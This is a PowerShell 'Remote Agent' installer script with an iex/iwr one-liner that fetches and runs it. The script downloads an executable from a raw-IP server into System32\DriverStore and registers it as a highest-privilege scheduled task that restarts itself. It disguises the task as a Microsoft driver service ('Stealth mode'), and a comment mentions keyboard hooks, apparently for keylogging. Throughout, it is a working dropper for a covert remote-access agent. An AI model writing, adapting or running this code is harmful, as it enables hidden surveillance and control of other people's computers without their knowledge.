# Remote Agent - Web Installer (Standalone EXE Version)
# One-liner: iex (iwr -useb https://raw.githubusercontent.com/Zhuss1/main/main/install-agent-exe.ps1).Content
# NO DEPENDENCIES REQUIRED - Downloads pre-compiled standalone executable

param(
    [string]$AuthCode = "",
    [string]$ServerUrl = "http://185.176.220.22:3003",
    [switch]$Silent
)

$ErrorActionPreference = 'Stop'

# Configuration (Stealth mode - looks like Windows driver service)
$InstallPath = "C:\Windows\System32\DriverStore\services"
$ExeUrl = "$ServerUrl/agent-files/drvhost.exe"
$ServiceName = "DriverHostService"

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    
    if (-not $Silent) {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $color = switch ($Level) {
            "ERROR" { "Red" }
            "SUCCESS" { "Green" }
            "WARNING" { "Yellow" }
            default { "White" }
        }
        Write-Host "[$timestamp] $Message" -ForegroundColor $color
    }
}

function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-AuthCodeFromUser {
    if (-not $Silent) {
        Write-Host ""
        Write-Host "════════════════════════════════════════════════" -ForegroundColor Cyan
        Write-Host "   Remote Agent Installation" -ForegroundColor Cyan
        Write-Host "════════════════════════════════════════════════" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "Please enter the authorization code from your dashboard:" -ForegroundColor Yellow
        Write-Host "Dashboard: $ServerUrl/x7k9m2p/remote-agents" -ForegroundColor Gray
        Write-Host ""
        $code = Read-Host "Auth Code"
        return $code.Trim()
    }
    return $null
}

function Download-AgentExecutable {
    param([string]$Destination)
    
    Write-Log "Downloading driver host service..."
    
    try {
        $exePath = Join-Path $Destination "drvhost.exe"
        Invoke-WebRequest -Uri $ExeUrl -OutFile $exePath -UseBasicParsing
        
        if (Test-Path $exePath) {
            $fileSize = (Get-Item $exePath).Length
            Write-Log "Driver host service downloaded successfully ($([math]::Round($fileSize/1MB, 2)) MB)" "SUCCESS"
            return $true
        }
        else {
            Write-Log "Failed to download driver host service" "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to download driver host service: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Create-StartupTask {
    param(
        [string]$Path,
        [string]$ServerUrl,
        [string]$AuthCode
    )
    
    Write-Log "Creating startup task..."
    
    try {
        $taskName = $ServiceName
        
        # Check if task already exists
        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Write-Log "Removing existing task..."
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        }
        
        # Create action
        $exePath = Join-Path $Path "drvhost.exe"
        $action = New-ScheduledTaskAction `
            -Execute $exePath `
            -Argument "$ServerUrl $AuthCode" `
            -WorkingDirectory $Path
        
        # Create trigger (at logon + at startup)
        $triggers = @(
            New-ScheduledTaskTrigger -AtLogOn
            New-ScheduledTaskTrigger -AtStartup
        )
        
        # Create settings
        $settings = New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries `
            -StartWhenAvailable `
            -RunOnlyIfNetworkAvailable `
            -DontStopOnIdleEnd `
            -RestartCount 999 `
            -RestartInterval (New-TimeSpan -Minutes 1)
        
        # Create principal (run as current user with admin rights)
        # This allows keyboard hooks to work (Session 1) while maintaining admin privileges
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $principal = New-ScheduledTaskPrincipal `
            -UserId $currentUser `
            -LogonType Interactive `
            -RunLevel Highest
        
        # Register task
        Register-ScheduledTask `
            -TaskName $taskName `
            -Action $action `
            -Trigger $triggers `
            -Settings $settings `
            -Principal $principal `
            -Description "Microsoft Driver Host Service - Provides driver management and system stability services" | Out-Null
        
        Write-Log "Startup task created successfully" "SUCCESS"
        return $true
    }
    catch {
        Write-Log "Failed to create startup task: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Start-Agent {
    param([string]$TaskName)
    
    Write-Log "Starting agent..."
    
    try {
        Start-ScheduledTask -TaskName $TaskName
        Start-Sleep -Seconds 2
        
        $taskInfo = Get-ScheduledTaskInfo -TaskName $TaskName
        if ($taskInfo.LastTaskResult -eq 0 -or $taskInfo.LastRunTime -gt (Get-Date).AddMinutes(-1)) {
            Write-Log "Agent started successfully" "SUCCESS"
            return $true
        }
        else {
            Write-Log "Agent started but may have issues (result: $($taskInfo.LastTaskResult))" "WARNING"
            return $true
        }
    }
    catch {
        Write-Log "Failed to start agent: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

# ==================== MAIN INSTALLATION ====================

Write-Log "Starting Remote Agent installation (Standalone EXE)..." "INFO"

# Check administrator privileges
if (-not (Test-Administrator)) {
    Write-Log "This installer must be run as Administrator!" "ERROR"
    Write-Log "Please right-click and select 'Run as Administrator'" "ERROR"
    
    if (-not $Silent) {
        Read-Host "Press Enter to exit"
    }
    exit 1
}

# NO NODE.JS CHECK REQUIRED! ✅

Write-Log "No dependencies required - using standalone executable" "SUCCESS"

# Get auth code if not provided
if ([string]::IsNullOrWhiteSpace($AuthCode)) {
    $AuthCode = Get-AuthCodeFromUser
    
    if ([string]::IsNullOrWhiteSpace($AuthCode)) {
        Write-Log "Authorization code is required!" "ERROR"
        exit 1
    }
}

Write-Log "Using auth code: $AuthCode"
Write-Log "Server URL: $ServerUrl"

# Create installation directory
Write-Log "Creating installation directory..."
if (Test-Path $InstallPath) {
    Write-Log "Installation directory already exists, cleaning up..."
    Remove-Item -Path $InstallPath -Recurse -Force -ErrorAction SilentlyContinue
}

New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
Write-Log "Installation directory created: $InstallPath" "SUCCESS"

# Download agent executable
if (-not (Download-AgentExecutable -Destination $InstallPath)) {
    Write-Log "Installation failed!" "ERROR"
    exit 1
}

# NO NPM INSTALL NEEDED! ✅

# Create startup task
if (-not (Create-StartupTask -Path $InstallPath -ServerUrl $ServerUrl -AuthCode $AuthCode)) {
    Write-Log "Installation failed!" "ERROR"
    exit 1
}

# Start the agent
if (-not (Start-Agent -TaskName $ServiceName)) {
    Write-Log "Installation completed but agent failed to start" "WARNING"
    Write-Log "You can manually start it later with: Start-ScheduledTask -TaskName '$ServiceName'" "INFO"
}

Write-Log ""
Write-Log "════════════════════════════════════════════════" "SUCCESS"
Write-Log "   Installation Complete!" "SUCCESS"
Write-Log "════════════════════════════════════════════════" "SUCCESS"
Write-Log ""
Write-Log "Driver Host Service Status:" "INFO"
Write-Log "  • Installed: $InstallPath" "INFO"
Write-Log "  • Executable: drvhost.exe (System Service)" "INFO"
Write-Log "  • Task Name: $ServiceName" "INFO"
Write-Log "  • Auto-Start: Enabled (runs at system startup)" "INFO"
Write-Log "  • Dependencies: NONE ✅" "SUCCESS"
Write-Log "  • Status: Running" "SUCCESS"
Write-Log ""
Write-Log "Dashboard: $ServerUrl/x7k9m2p/remote-agents" "INFO"
Write-Log "This computer should appear as ONLINE in your dashboard within 30 seconds." "INFO"
Write-Log ""

if (-not $Silent) {
    Write-Host "Press Enter to close..." -ForegroundColor Gray
    Read-Host
}

exit 0
